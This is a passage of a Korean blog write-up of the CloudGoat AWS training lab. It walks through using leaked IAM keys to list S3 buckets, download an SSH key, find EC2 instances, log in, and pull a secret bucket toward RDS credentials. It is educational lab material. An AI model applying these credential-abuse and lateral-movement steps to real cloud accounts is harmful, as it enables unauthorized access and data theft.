수집합니다.</li>\n<li>공겨자는 발견한 Credential 을 사용해서 RDS 데이터베이스에 액세스 할 수 있고 시나리오의 목표인 RDS 데이터베이스에 저장된 정보를 확인할 수 있습니다.</li>\n</ul>\n</li>\n<li>EC2 쉘을 이용하여 S3 bucket 리스트를 확인합니다.\n<ul>\n<li>쉘을 획득한 EC2 인스턴스를 통해서 공격자는 Private S3 Bucket에 액세스할 수 있습니다.</li>\n<li>Private S3 Bucket 내에서 공격자는 RDS Database에 대한 로그인 Credential이 포함된 텍스트 파일을 찾을 수 있습니다.</li>\n<li>공격자는 EC2 인스턴스를 사용해서 Credential 파일에서 참조하는 RDS 데이터베이스를 나열 하고 분석합니다.</li>\n<li>공격자는 서버에서 발견한 Credential을 사용해서 RDS 데이터베이스에 액세스할 수 있고 시나리오의 목표인 RDS 데이터베이스에 저장된 Security Text를 획득할 수 있습니다.</li>\n</ul>\n</li>\n</ol>\n<p><strong>McDuck IAM 사용자를 사용하여 Exploit</strong></p>\n<ul>\n<li>AWS 환경을 분석을 통해서 AWS CLI Credential ket를 사용해서 S3 bucket을 나열하여 발견할 수 있습니다.</li>\n<li>공격자는 다양한 리스트에서 S3 Bucket을 발견하지만 하나만 접근을 할 수 있고 하나의 S3 Bucket 내에서 one-pair ssh key를 찾을 수 있습니다.</li>\n<li>공격자는 EC2 인스턴스를 나열하고 로드 밸런서 뒤에서 EC2 인스턴스를 찾습니다.</li>\n<li>공격자는 S3 Bucket 에서 발견한 SSH 키를 통해서 공격자가 EC2 인스턴스에 로그인이 가능하다는 것을 확인할 수 있습니다.</li>\n<li>EC2 인스턴스를 통해서 작업하고 공격자는 Private S3 Bucket을 분석하고 접근이 가능합니다.</li>\n<li>Private S3 Bucket내에서 공격자는 RDS 데이터베이스에 대한 로그인 Credential이 포함된 텍스트 파일을 발견할 수 있습니다.</li>\n<li>공격자는 해당 Credential 파일에서 참조하는 RDS 데이터베이스를 나열하고 검색할 수 있습니다.</li>\n<li>공격자는 발견 한 자격증명을 사용하여 RDB 데이터베이스에 액세스하고 시나리오 목표인 RDS 데이터베이스에 저장된 정보를 찾을 수 있습니다.</li>\n</ul>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"rds-amazon-relational-database-service\" style=\"position:relative;\"><a href=\"#rds-amazon-relational-database-service\" aria-label=\"rds amazon relational database service permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDS (Amazon Relational Database Service)</h3>\n<ul>\n<li>클라우드에서 관계형 데이터베이스를 간편하게 설정, 운영 및 확장할 수 있습니다.</li>\n<li>하드웨어 프로비저닝, 데이터베이스 설정, 패치 등 소목적인 관리 작업을 자동화하면서 비용 효육적이고 크기 조정 가능한 용량을 제공합니다.</li>\n<li>다양한 데이터베이스 인스턴스 유형으로 메모리, 성능 또는 I/O 최적화등을 제공합니다.</li>\n</ul>\n<h3 id=\"iam-user-mcduck-접근-가능한-정책-나열\" style=\"position:relative;\"><a href=\"#iam-user-mcduck-%EC%A0%91%EA%B7%BC-%EA%B0%80%EB%8A%A5%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%82%98%EC%97%B4\" aria-label=\"iam user mcduck 접근 가능한 정책 나열 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM User: McDuck 접근 가능한 정책 나열</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAABAElEQVQY00XOXU+CYADFcdTwrTKzIoeZZr4CPvIqAgJKZpvlVpuXff+v8W/RRRe/nYuznR0pezlg2QFBlLFarhHpgfvoiOeG2G6EITw8P0E3XCbTBZruMBzPyb4a7E7n6LZKrd6hddujUlOQhLmmPxC53mDOYGShdmc8PGoYImCqLVHaQzrdGRcNlXL1jmpdoVy9oSg3KcrXFM/+SeF6jzAjLCfJmU6KYcWMJjaen7Hbf5JuP0g277jLLU/PgvHUYTgxqF+2kCt/Q4VSMyfFySu2E+IHGwI/Ro/eaEdHFsLDdiJMa4W/SvP+N10vxnFDjt8ddqcGmqUiywqF0lX+8AekmnYLFvfNewAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/7d0fea6c8a929e3e275be50a5796837d/37523/1.png\"\n        srcset=\"/static/7d0fea6c8a929e3e275be50a5796837d/e9ff0/1.png 180w,\n/static/7d0fea6c8a929e3e275be50a5796837d/f21e7/1.png 360w,\n/static/7d0fea6c8a929e3e275be50a5796837d/37523/1.png 720w,\n/static/7d0fea6c8a929e3e275be50a5796837d/fcbaf/1.png 895w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">cloudgoat_output_aws_account_id <span class=\"token operator\">=</span> <span class=\"token number\">111111111111</span>\ncloudgoat_output_lara_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\ncloudgoat_output_lara_secret_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span>\ncloudgoat_output_mcduck_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\ncloudgoat_output_mcduck_secret_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACGElEQVQoz1WSWW/TUBCFTVkChbZZHGdzvMd7YsdOnDi7s1DUFHjgrS8gIfET+PsHzUSOxMPo2tf3fnPOGQvnrz+QL/dYrA4oikfkp+/wv/3EYlFgf3zCYrnHenvCdveM0znD779DvLwE+DU44I/8GYkYoqsHMMwIt5/aEMJRjr4aQFZ8dHo2GpKBVs9Fp+dc9mQHUttCr++h1TUhazYUzYUie9CVEKoa8lnDivHxrgthku3hhTN4QYae4qPZsiArHtpdB13ZRbWuMrjRNCBKJlQ9Qqtjo9pQIbZNNJo6RMlAXdRx86YGYVOcYbsTpNMdl+NNkWYFwtECcbLhRrP8CC+YYRQvsVx/wTBeMoiUU0OC31dlvHpdhZDNjwyMxms43gSaMUIwzHmPIPSeTHeIkzUXnaOY6LnZMlH5IOHd+yYXA+N0wxmo+pBzoq4KP/swB2O2R5YJTFmXeVM91PocBakk25VbCcJ6+wTditga2SWw62cMs5yEcyTFpLY844dzKFqIuqjhbUVkZZQfK6ShWHZysRItoJkRXyDLdJmUUJbkhHIdRkteZTXAfbV/hZUlTOcHHjkdjMYr6AQclsAJx0ENaBC2N+FvpL783QTh7qqOgdvimS3SZKkGTopxumEIKaHsqClNmqaczQ+85qtHBpfAq8J0WrBCukzdKUPHn3IMBG93bc6QInGD7BKLMeL9WkOFcPPwH/AfYv0/FL+hxBMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/8700800edea00dbbde58e6cd0368b843/37523/2.png\"\n        srcset=\"/static/8700800edea00dbbde58e6cd0368b843/e9ff0/2.png 180w,\n/static/8700800edea00dbbde58e6cd0368b843/f21e7/2.png 360w,\n/static/8700800edea00dbbde58e6cd0368b843/37523/2.png 720w,\n/static/8700800edea00dbbde58e6cd0368b843/59000/2.png 917w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>유출된 McDuck 의 AWS Credential을 통해서 사용할 수 있는 서비스를 나열하였습니다. 관련 권한들을 보면 <code class=\"language-text\">EC2, RDS, S3</code> 권한이 있는 것을 확인할 수 있어 뭔가 공격할 수 있는 벡터가 많아 보입니다.</li>\n</ul>\n<h3 id=\"s3-bucket-리스트-분석및-하드-코딩된-ssh-key-수집\" style=\"position:relative;\"><a href=\"#s3-bucket-%EB%A6%AC%EC%8A%A4%ED%8A%B8-%EB%B6%84%EC%84%9D%EB%B0%8F-%ED%95%98%EB%93%9C-%EC%BD%94%EB%94%A9%EB%90%9C-ssh-key-%EC%88%98%EC%A7%91\" aria-label=\"s3 bucket 리스트 분석및 하드 코딩된 ssh key 수집 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>S3 Bucket 리스트 분석및 하드 코딩된 SSH key 수집</h3>\n<ul>\n<li>AWS 계정에서 S3 버킷을 나열해 보겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABN0lEQVQY0y2PbU+CUABGr+myLOsqFrmQEkWQJAQV9QYCvizdWmv1/3/LabE+nD0fni/niO3+gyw/sogz0uxImh7wdt9MFjlKbZmGCmccYY+mJY4bMrRDHF/Hja/xbZ2iETCpW1QvNITnrxiMIob/+MEbhuGid20M06P76KDdWdy2TW5bJu1On5b2ROVMQwiJqEhE9RpRbVKpSsTh/ZO8OFFsT2TFEbXO6CxPtM0xVt/loWvxbHkMbL/EcQMGwymh0tl8NghVh5umgWz1qF/eI6J5hh8ovMmS1zDBdiJsL2Y8WeF6C5zxvPxf/BXhbMNfkWyb1OqS+pXk/FJyVmtRO9fKFfn2xCLeMI9TVqooDXvFD15csIwT/CBmuc5RyY4k3fOW7hg5M2aJTv7VIEo6NG8MKjVZJv8Cox6SN9bYywIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/a4b29e1a06f00e939368d6b5e3eed175/37523/3.png\"\n        srcset=\"/static/a4b29e1a06f00e939368d6b5e3eed175/e9ff0/3.png 180w,\n/static/a4b29e1a06f00e939368d6b5e3eed175/f21e7/3.png 360w,\n/static/a4b29e1a06f00e939368d6b5e3eed175/37523/3.png 720w,\n/static/a4b29e1a06f00e939368d6b5e3eed175/d9217/3.png 904w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 게정에서는 3개의 Cloud Goat와 관련된 버킷이 있는 것을 확인할 수 있습니다. 해당 S3 버킷을 다운로드 해보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws s3 sync s3<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>cg<span class=\"token operator\">-</span>keystore<span class=\"token operator\">-</span>s3<span class=\"token operator\">-</span>bucket<span class=\"token operator\">-</span>rce<span class=\"token operator\">-</span>web<span class=\"token operator\">-</span>app<span class=\"token operator\">-</span>cgid7ge6zuhcu1 <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>key <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile mcduck</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLklEQVQY0zWQyU7CABRFiySGAAUVQQhBESid54EylEksU5CNCzf8/2cc00YXJ/fl5SXv5ArLVUoYJSSrFNeOGNgzKv6esWQgKw79gYqm+2i6h2EG2M4ETY9Ijs/sf8oEyyZircdj441ytYNgWFNkLUTVJ4xkj7ESMBy7eb4PbYaSk8+qHmE583x3X2oiCDUKxYw6heIDwt1f7g9XMstdemH3cWR5+kY639isU1abA4tkR3bzz2Z7xLJnbL9eudxa+EkbUewh1ruUyi2E7HN/YJGZ6uY0NzHMODfOcLwllrsgiDZoRoyiRfjhGs2YIskTRpKPrIZ0ujIVsYPgB3NUzcVxY1w7ZOQlVCcnVMVCUV1GkoFpR3l3GY4XY5ox2+sL51uZ2WebRmPIU7Ofd/gLpxSYD9lDkRYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/8f9af5ffcf50839cbc95626993287e3d/37523/4.png\"\n        srcset=\"/static/8f9af5ffcf50839cbc95626993287e3d/e9ff0/4.png 180w,\n/static/8f9af5ffcf50839cbc95626993287e3d/f21e7/4.png 360w,\n/static/8f9af5ffcf50839cbc95626993287e3d/37523/4.png 720w,\n/static/8f9af5ffcf50839cbc95626993287e3d/636c2/4.png 911w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"ssh-접속전-준비-과정\" style=\"position:relative;\"><a href=\"#ssh-%EC%A0%91%EC%86%8D%EC%A0%84-%EC%A4%80%EB%B9%84-%EA%B3%BC%EC%A0%95\" aria-label=\"ssh 접속전 준비 과정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSH 접속전 준비 과정</h3>\n<ul>\n<li><code class=\"language-text\">keystore</code>에서 파일을 다운로드하였는데 이는 SSH key-pair 처럼 보입니다. SSH key-pari, EC2 인스턴스를 나열할 수 있는 기능이 있기 때문에 SSH로 접근이 가능한 EC2 인스턴스가 있는지 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLUlEQVQY0z2PbU+CYBiFH9/yrRGQRjnFFzANBEMUEZyY0twyP/UL+tCP6NdfDXV9uHbO7vvsbEeMLZ9NciCK9+zST9L9B25y5MnbspjHTJwAxw2YeisM08EwJ/R6Ds92l2VaZxopqM0WIi9TrWuIfFFBktvY7gpj6NFqj8+PSu2Bav2RSk07a6GkkivIZPmMzOcKyhX5/ybumwMkWUdSdJqaSbtrcye1KJcUiuUm5ZpG8aaBELdX6lckhFARQj77S6GC8BcbgjAhXqeE0Q7XmWMGe7TXhIk1Y/Tinaf2+had7oj+wKKj2wwtnfBQw1srqI3L5KxUWLZPsn1n5oeE0ZYoiBgkJ+T4xMJbMHF9HHdOvH4jXG3YJDvCZcr+aPH9e8PXj0rPMMgVVPJFmT+lGonSM93GJgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/b278cc8917e118df4300ac7fe2ac088a/37523/5.png\"\n        srcset=\"/static/b278cc8917e118df4300ac7fe2ac088a/e9ff0/5.png 180w,\n/static/b278cc8917e118df4300ac7fe2ac088a/f21e7/5.png 360w,\n/static/b278cc8917e118df4300ac7fe2ac088a/37523/5.png 720w,\n/static/b278cc8917e118df4300ac7fe2ac088a/84cc5/5.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ec2 describe<span class=\"token operator\">-</span>instances <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">\"Reservations[*].Instances[*].Tags\"</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>output text <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile mcduck</code></pre></div>\n<ul>\n<li>AWS 게정에서 실행중인 EC2 인스턴스가 있는 것을 확인할 수있으며 SSH key-pair를 사용하여 EC2 인스턴스에 접근을 해보도록 하겠습니다.</li>\n<li>먼저 접근을 하기전에 공용 IP를 알아야 하기 때문에 자주 사용하던 쿼리로 <code class=\"language-text\">PublicIpAddress</code> 를 조회하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ec2 describe<span class=\"token operator\">-</span>instances <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">\"Reservations[*].Instances[*].PublicIpAddress\"</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>output text <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile mcduck</code></pre></div>\n<ul>\n<li>다음과 같이 해당 EC2 서버의 IP 대역을 확인하고 접속할 준비를 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABI0lEQVQY06WPy1LCQBBFJwGlCpKZCY+ETEAeCa+AESogBaIlsnHj/3/O0QQWunZx696+3YvTIk4yji8X0mXO/nDmsH8jO38Rbi+kizWz+YbJNGOxzMub7GnPfLHBmCnTNOb46fD8oQhMD7vaRDgyou3HjJM1s8WO/mCF5z2gZETdNTRcg6N6ZS5updenVg8QtkKIQt5VlsKqaMQoXpFvT+S7V+ZpznTyiB5m1AYZUTjG747o+ANCExOE49JNlOAHMcNkSP7usD5J2r7BqhSEbojX7NNwurjKIGVIvTXk3hugdFR2jgxRuofUUelF33BCdKtL0Fd0Ik3d6WBXClqrwJYlsrBuLlwsy73Nv3fyb/f7ZVtjVTXCrnr8S3cau6qv+YfwG+GxlOvSW8RzAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/fdb73ae4534e73d626119120ef960c63/37523/6.png\"\n        srcset=\"/static/fdb73ae4534e73d626119120ef960c63/e9ff0/6.png 180w,\n/static/fdb73ae4534e73d626119120ef960c63/f21e7/6.png 360w,\n/static/fdb73ae4534e73d626119120ef960c63/37523/6.png 720w,\n/static/fdb73ae4534e73d626119120ef960c63/d9217/6.png 904w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 98.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAADOUlEQVQ4y3VUaZOiSBSsbo/GVlFQvA9EBBVBEB3EVmdXe2Z3Iubj/P+/khtZHhFu2B9evOKorMyX75WIN0ekuzO2uzPS9G8skxOcw2+EYQrL9jGeBHBnq0ueRph5McZ2CDdoYRqX0B83kH9roFBsoN6wIIJoD2e6RhBesuPG8BcJltEBy9UB37afCOMj1skJi2CHcHWE7awghA4hNAhRhchUkFfq6A3mEPNFAn/5gf3xF5L0Ex/Hf+Xm7e4HNskJq/V32E6E8SRCodhCNl/DW6GBbF5HJldFJqfhNaPhrWCg1XEgyEqeHB8xWySIVkeEV9Y8yLSWaHen6PZnKJY7KKldvGbJrHJh+EKGKhRKNkYQwWqPINwhio/w/ASL8AP+txMGpgetNoDRtKBWuyiW2yipBGxLhuWqDrVegV4yoGVbUAoGmu0JxM/dP9geztimJ+z3Z2xPv+H++IPD4RNJ+heieAdnGmI09mA7AWzHhznyEaYtrH8WcHZHOOcDlBQD7f4Uwve2cGYbeH4q88RdYRmkCGhKdEC0/o65n8IPPzBfbOU7yw6vhlylZ0rSlE5vCmE5EQbmQjpnWj5MK0Bv6GE0XsofhiNfBp/pYlUfoKL1kVNq0pRsTkPmakq760IQzAtSaLUhmh1Hnj5xY+nqyF5Cr5vS2ZdM9WLGiwrxWrk/M7i+A9JqnqxWe6g1LMmKjt7yjVUmp0ugG8gN6BHQuTCkTAJzXa70UNEG6A892O4KRnMsJXIKcm/1B6BHhtfGJhg3trqulM2PZEPQ9vVdudKVmSq+ArxPyuVnUzIgCGvGzVV9eGfLHhSiDCHUB5kPDJU6umybRsuWRjBoBB3llNAYMndnG9SbYymXDU32XzOcQbA+3My2ICidZRnImCy1uilNoRJmgj6v4XWWWXya0enNZBC0qHYgRFFKlG1ybRXmryQX3hvo9FwIghD0FnSVbI2mjbxiyJ//H08Bi01Y9vIimUboxgg1YyRl0RQaobw3ZVOzfgSnXK6fSeYFSzKC1xPHzp1vYI4DOTU0hoB0mVcWQ6325UG8vp4DNiUZodbaKOutS2jdOwPGbcTE62V9i2eSlfeGbJv/AKM9Bm3e833FAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/98b94b34f0f963b56594a67961b8207d/37523/7.png\"\n        srcset=\"/static/98b94b34f0f963b56594a67961b8207d/e9ff0/7.png 180w,\n/static/98b94b34f0f963b56594a67961b8207d/f21e7/7.png 360w,\n/static/98b94b34f0f963b56594a67961b8207d/37523/7.png 720w,\n/static/98b94b34f0f963b56594a67961b8207d/d30ee/7.png 980w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>와우 키를 획득하고 접속을 시도하니 접속이 성공된 것을 확인할 수 있습니다.</li>\n<li>EC2 인스턴스에는 S3 Storage와 상호 작용할 수 있는 인스턴스 프로파일이 있는 것이 기본적인 패턴 입니다.</li>\n</ul>\n<h3 id=\"접근-가능한-s3-bucket-분석\" style=\"position:relative;\"><a href=\"#%EC%A0%91%EA%B7%BC-%EA%B0%80%EB%8A%A5%ED%95%9C-s3-bucket-%EB%B6%84%EC%84%9D\" aria-label=\"접근 가능한 s3 bucket 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>접근 가능한 S3 Bucket 분석</h3>\n<ul>\n<li>EC2 인스턴스가 다른 두 곳의 S3 bucket에 있는 객체 에 접근할 수 있는지 확인해 보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws s3 sync s3<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>cg<span class=\"token operator\">-</span>secret<span class=\"token operator\">-</span>s3<span class=\"token operator\">-</span>bucket<span class=\"token operator\">-</span>rce<span class=\"token operator\">-</span>web<span class=\"token operator\">-</span>app<span class=\"token operator\">-</span>cgid7ge6zuhcu1 <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>secret</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      